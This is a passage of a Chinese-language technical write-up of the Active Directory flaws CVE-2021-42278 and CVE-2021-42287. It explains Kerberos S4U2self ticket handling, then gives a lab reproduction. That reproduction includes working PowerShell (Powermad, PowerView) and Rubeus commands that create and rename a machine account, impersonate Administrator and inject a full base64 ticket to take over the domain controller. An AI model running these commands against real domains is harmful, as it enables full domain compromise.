  * 通过生命周期字段检查 TGT 是否过期
  * 检查 Authenticator2 是否在 TGS 的缓存中
  * 若原始请求中的网络地址不为 NULL，比较 TGT 中的 IP 和请求的 IP
验证成功后，随机生成 Client 所请求服务的会话密钥 Client/Server Session Key；  
使用 **Server 密钥（即服务器计算机的NTLM Hash）** 对 Client/Server Session Key、Client Info（包含
Client ID）、TimeStamp 加密得到 Client-To-Server Ticket（也称为 **ST** ）；  
使用 Client/TGS Session Key 对 Client/Server Session Key 加密得到sessionkey_tgs  
最终将 Client-To-Server Ticket、sessionkey_tgs 返回给 Client。
* * *
域控机器名：MachineName$  
伪造机器名：MachineName
介绍完ST票据，其实漏洞的核心点也已经触手可及了，当TGS使用TGS密钥对用户发送过来的TGT进行解密后，获取到了机器名：MachineName，同时由于用户请求的是S4U2self服务，因此需要用机器名对应的密钥（即主机自身的密钥）来对ST进行加密，然而我们已经将主机名修改为了其他名称，此时域内是不存在MachineName的机器名的，因此TGS自行在MachineName后添加了
$
符号，再次在机器名列表中进行搜索，域控的机器名与之匹配，于是TGS就使用了MachineName$（也就是域控）的密钥加密了S4U2self的ST发给了用户，当用户使用该ST去访问域控时就获取了域控的控制权。  
这里关于PAC的其实还有写不清楚的地方，看其他的分析里说法是TGS在利用域控的密钥对ST进行加密的时候就顺便提供了域控账户的PAC到ST中，从而使得域控在使用自身密钥解密ST后，通过了向TGS验证PAC有效性的过程。（没有深究了）
###  0x3 手动复现
假如域内有一台域控名为 DC（域控对应的机器用户为 DC），此时攻击者利用漏洞 CVE-2021-42287 创建一个机器用户
saulGoodman，再把机器用户 saulGoodman$ 的 sAMAccountName 改成 DC（伪）。然后利用 DC（伪）
去申请一个TGT票据。再把 DC 的sAMAccountName 改为 saulGoodman。这个时候 KDC 就会判断域内没有 DC
（伪）和这个用户，自动去搜索 DC（DC$是域内域控DC（真） 的 sAMAccountName），攻击者利用刚刚申请的 TGT 进行
S4U2self，模拟域内的域管去请求域控 DC（真） 的 ST 票据，最终获得域控制器DC的权限。  
注意复现过程中使用了 powerspolit 和 Rubeus 两个工具
**1.创建本地机器账户**
    $password = ConvertTo-SecureString 'ComputerPassword' -AsPlainText -Force
    New-MachineAccount -MachineAccount "ControlledComputer" -Password $($password) -Domain "settest.com" -DomainController "administrator.sectest.com" -Verbose
最开始执行上述两条指令时出错，尝试使用ps脚本添加，发现当前用户不能执行ps脚本
尝试使用 `set-executionpolicy remotesigned` 解除限制时发现需要管理员账户，姑且用管理账户解开该限制
    # 脚本创建
    powershell
    Set-ExecutionPolicy Bypass -Scope Process
    Import-Module .\Powermad.ps1
    # 运行完后需要输入一下密码：12345678（可任意密码）
    New-MachineAccount -MachineAccount saulgoodman -Domain sectest.com -DomainController administrator.sectest.com -Verbose
    # 验证是否添加成功
    net group "domain computers" /domain
但是在执行添加账户指令时发现如下报错，查看报错脚本对应位置
由于是LDAP服务相关的错误，且在DC上查看 389
端口正常，因此猜测问题出在参数上，向上回溯发现可能是DomainController参数出现的问题，根据代码逻辑发现如果不指定该参数的话，脚本会自行补全。
删除 DomainController 参数后执行
成功添加本地机器账户
**2.清除SPN信息**
    # 导入一下 PowerView.ps1
    Import-Module .\PowerView.ps1
    Set-DomainObject "CN=saulgoodman,CN=Computers,DC=redteam,DC=red" -Clear 'serviceprincipalname' -Verbose
这里才发现，上面用到的脚本其实是git上一个专门用于域渗透的项目（PowerSploit）里提供的功能，用到对应的功能的时候就将对应的ps脚本上传到主机上，最终执行结果如下
**3.重设机器名称**
这里开始利用CVE-2021-42278漏洞仿冒DC机器名
    # 修改当前机器名称为DC机器名
    Set-MachineAccountAttribute -MachineAccount saulgoodman -Value "WIN-E13FAE6DQB9" -Attribute samaccountname -Verbose
**4.请求TGT**
使用仿冒的用户名请求AS时，因为漏洞的原因 username 和 username$ 被认为是同一个账户，因此返回了username$ 的 TGT  
这里基本都用的是 
的工具来完成的，此处就踩着前人的肩膀了，尽量避免踩坑，查看git才发现这玩意还要自己编译
    ./Rubeus.exe asktgt /user:WIN-E13FAE6DQB9 /password:12345678 /domian:sectest.com /dc:WIN-E13FAE6DQB9.sectest.com /nowrap
**5.恢复原机器名**
已经获取到TGT后将原机器账户名更改，使得第二个漏洞得以触发
    Set-MachineAccountAttribute -MachineAccount saulgoodman -Value "saulgoodman1" -Attribute samaccountname -Verbose
**6.Request S4U2self（获取DC票据）**
通过S4U2self申请TGS Ticket，接着DC在`TGS_REP`阶段，这个账户不存在的时候，DC会使用自己的密钥加密`TGS
Ticket`，提供一个属于该账户的`PAC`，然后我们就得到了一个高权限ST
    ./Rubeus.exe s4u /self /impersonateuser:"Administrator" /altservice:"ldap/WIN-E13FAE6DQB9.sectest.com" /dc:"WIN-E13FAE6DQB9.sectest.com" /ptt /ticket:doIFMjCCBS6gAwIBBaEDAgEWooIEQzCCBD9hggQ7MIIEN6ADAgEFoQ0bC1NFQ1RFU1QuQ09NoiAwHqADAgECoRcwFRsGa3JidGd0GwtzZWN0ZXN0LmNvbaOCA/0wggP5oAMCARKhAwIBAqKCA+sEggPnE291dHjoyQEYfUdVYVz9JLJHj3Ocv0isIBskmG8TxiPbmztewf4kno7c079VnLO3yaQvtD2JcmsZHJelTE1HZBQrEvbj73rvR9ruCQbyE7WuwzTLhPTBBg7lxm8guQh9uYb5VlvrfAgdXevNbyveWf9HSFzanqunLN13hckRsSr+UOUXsl0aYRMv/o0gmLpUT7GRqDXvAMPlTn35EUoRAJVPIObJJ+5TJsV8uzmCu2bBtrtGd5UBoblm4P09nn1KAxXTr0mvOil1j7aRXNKiUn8e5MHfYgELBb9k4eiHm5sLL6HTiEdWt3p/rANUzLnDUisSl9w3h4xiW+IK2eZIRVoVq2GtkrW1vButy+DUJ8T61XD/50E4MfoeOFgiJurzq7n3i2qdgFmYE5xDqvS2xK12WCbxZoTjq6h4s5Cu9QvR0zN73bSIAkIKtkY1tiiKr5G04e2WBIlsWc6rdgnOUGLlEOScnFP5cdERkkppvUayiEGYmiKeFUQA9R6/jHHDBNHJzwnEu+Z8jvNrqsbUEsb9hglsThI01TxRyF9lpLqkUZhTlZ9jEVk5vTl9l7JIrqbuS+ymRcTUAMWj9/8t+rNZKNbWnpk8sedsvPV12ni4QD5Hw1QD+oVJkDzqiYzlHTpE0wtvOVsPEm+M2kFdgV5e6/DEgpOvJNFOQsSrhh2keFs1QTwSJyngODQLrcdeRdWrn8I7FJUxByeLG1jexs10XsCEBwiKde9YUXvaYxVcr7Sr6AW4VTbdhEmqIvARFJW8cTwkghHRK2PGhtjbbJNOA+uafXP0t/Z5qTE5tT5Nj+sDWnnxZu1ikAXQJTce9uAiVfN6NcA9YzUMEEir2ORq1NGSpr+rTfB0NDlpZK2AA6nYVrbC2CdpscgokN1FC48rYt7Qrcoc8kvYR95TaXMGNP2WSRiChdtGB3T5IjIHsvsAKzW8Gzcbdna1oxBp0fACogzLQ3W5SCdn7xOO6DcDRjMHPYemtFTnj4C5YVi4FkdZ9GNhldIm60ImzFpBgrFeut0lthfOnwYyianRNIpHuT50vz9Z+mW4eO9GRzHPGmpo/ns+8T6mKWy9VdOF0eZ77lm0sAtJckPlFgv9VWcS2bfwGeqcDvJctHpSmIL/zSpWjKrZUlknytLZoNAIWk4lDivScUn5+y6pH6vsxjG5Oa3CsIGgAhhXfcztJ0JyFY5apeMhm40Ye5Eyr5aUJf0srju7Q1wIAolWcH+wNqJWa0kiQlb/oxhyrBhIXMV539N2/ZOzrSXYJUSzJGYmp1xVvV2yAyCM62G5nAW4VJwYXj1cANwGzLzdLgeGF0dcEMjFzbEjo4HaMIHXoAMCAQCigc8Egcx9gckwgcaggcMwgcAwgb2gGzAZoAMCARehEgQQgpOpL4DhG9V2R3y2rAIeWaENGwtTRUNURVNULkNPTaIcMBqgAwIBAaETMBEbD1dJTi1FMTNGQUU2RFFCOaMHAwUAQOEAAKURGA8yMDIxMTIxNDE2MzY0NFqmERgPMjAyMTEyMTUwMjM2NDRapxEYDzIwMjExMjIxMTYzNjQ0WqgNGwtTRUNURVNULkNPTakgMB6gAwIBAqEXMBUbBmtyYnRndBsLc2VjdGVzdC5jb20=
**7.验证TGT**
## 参考链接
​  
[https://myzxcg.com/2021/08/域用户与域成员机器关系及利用/](https://myzxcg.com/2021/08/%E5%9F%9F%E7%94%A8%E6%88%B7%E4%B8%8E%E5%9F%9F%E6%88%90%E5%91%98%E6%9C%BA%E5%99%A8%E5%85%B3%E7%B3%BB%E5%8F%8A%E5%88%A9%E7%94%A8/)  
​  
​  
[https://wooyun.js.org/drops/域渗透——Pass The
Ticket.html](https://wooyun.js.org/drops/%E5%9F%9F%E6%B8%97%E9%80%8F%E2%80%94%E2%80%94Pass%20The%20Ticket.html)​  
​  
​